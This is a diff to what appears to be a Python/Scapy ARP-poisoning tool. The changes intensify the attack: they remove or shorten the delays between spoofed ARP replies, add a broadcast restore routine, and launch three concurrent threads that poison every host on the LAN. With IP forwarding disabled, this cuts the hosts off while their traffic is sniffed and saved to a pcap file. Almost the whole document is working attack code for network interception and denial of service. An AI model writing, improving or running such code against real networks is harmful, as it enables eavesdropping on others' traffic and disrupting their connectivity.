@@ -65,7 +65,7 @@ def arp_poison(target_ip):
 		while True:
 			send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
 			send(ARP(op=2, pdst=target_ip, hwdst=hosts[target_ip], psrc=gateway_ip), verbose=False)
-			time.sleep(2)
+			time.sleep(1)
 	except KeyboardInterrupt:
 		print("restoring network")
 		restore()
@@ -87,7 +87,7 @@ def arp_poison_broadcast():
 					continue
 				send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
 				send(ARP(op=2, pdst=target_ip, hwdst=hosts[target_ip], psrc=gateway_ip), verbose=False)
-			time.sleep(2)
+			#time.sleep(2)
 	except KeyboardInterrupt:
 		print("restoring network")
 		restore()
@@ -108,6 +108,18 @@ def restore():
         send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5, verbose=False)
         #disable_forwarding()
         enable_forwarding()
+
+def restore_broadcast():
+	for i in range(1, 255):
+		if i == self_id:
+			continue
+		target_ip = lan + "." + str(i)
+		if target_ip not in hosts.keys():
+			continue
+		send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=hosts[target_ip], psrc=target_ip), count=5, verbose=False)
+		send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5, verbose=False)
+		#disable_forwarding()
+		enable_forwarding()
 
 
 while 1:
@@ -192,13 +204,18 @@ while 1:
 			print("restoring network")
 			restore()
 		print("restoring network")
-		restore()
+		restore_broadcast()
 
 	elif option == "5":
 		try:
 			disable_forwarding()
-			poison_thread = threading.Thread(target=arp_poison_broadcast)
-			poison_thread.start()
+			poison_thread1 = threading.Thread(target=arp_poison_broadcast)
+			poison_thread1.start()
+			poison_thread2 = threading.Thread(target=arp_poison_broadcast)
+			poison_thread2.start()
+			poison_thread3 = threading.Thread(target=arp_poison_broadcast)
+			poison_thread3.start()
+			
 			#sniff_filter = "ip host " + target_ip
 			print(f"[*] Starting network capture.")
 			packets = sniff(prn=mitm_callback, iface="en0")
@@ -206,7 +223,7 @@ while 1:
 			wrpcap("lan_denied.pcap", packets)
 		except KeyboardInterrupt:
 			print("restoring network")
-			restore()
+			restore_broadcast()
 
 disable_forwarding()
 			
